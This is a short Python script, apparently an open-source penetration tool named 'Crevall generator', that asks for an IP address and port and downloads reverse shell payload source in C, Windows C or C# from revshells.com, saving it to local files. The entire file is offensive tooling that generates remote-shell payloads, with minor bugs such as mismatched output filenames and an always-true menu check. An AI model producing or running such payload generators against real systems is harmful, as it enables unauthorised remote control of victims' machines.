# Author = Raed Ahsan
# Creation  Date = 06/07/2022
# Project by Rtelligenc
# Linkedin = https://linkedin.com/in/raed-ahsan
# Youtube = https://youtube.com/@rtelligenc
# patreon = https://www.patreon.com/raedahsan?fan_landing=true
# Github = https://github.com/R-Security



import requests
import time

print('\033[1m', "Welcome to Rtelligenc Crevall generator", '\033[0m')    

# For C windows reverse shell generation
def C_windows():
    ip = input("Please enter Target IP address: ")
    port = input("Please enter Target PORT: ")
    print("[*] Processing....")
    time.sleep(2)
    capture = requests.get("https://www.revshells.com/C%20Windows?ip={}&port={}&shell=pwsh&encoding=pwsh".format(ip, port), 'html.parser')
    with open("Crevall_windows.c", 'w') as payload:
        payload.write(capture.text)
        payload.close()
    print("[*] Congratulations, Payload created")
    print("Located in current directory called Crevall_windows.c")


# For C reverse shell generator
def C():
    ip = input("Please enter TARGET IP address: ")
    port = input("Please enter TARGET port: ")
    print("[*] Processing...")
    time.sleep(2)
    capture = requests.get("https://www.revshells.com/C?ip={}&port={}&shell=pwsh&encoding=pwsh".format(ip, port), 'html.parser')
    with open("Crevall_C.c", 'w') as payload:
        payload.write(capture.text)
        payload.close()
    print("[*] Revshell generated with file name : Crevall_C.c")


# For C sharp reverse shell generator
def C_sharp():
    ip = input("Please Enter TARGET IP address: ")
    port = input("Please enter TARGET port: ")
    print("[*] Processing...")
    time.sleep(2)
    capture = requests.get("https://www.revshells.com/C%23?ip={}&port={}&shell=pwsh&encoding=pwsh".format(ip, port), 'html.parser')
    with open("Crevall_sharp.c", 'w') as payload:
        payload.write(capture.text)
        payload.close()
    print("[*] Revshell generated with file name: Crevshell_sharp.c")


def selection():
    print("1 - C_windows \n", "2 - C \n", "3 - C sharp \n")
    selection = int(input("Please enter your selection[1-3]: "))
    if [1,2,3]:
        if selection == 1:
            C_windows()
        if selection == 2:
            C()
        if selection == 3:
            C_sharp()

selection()
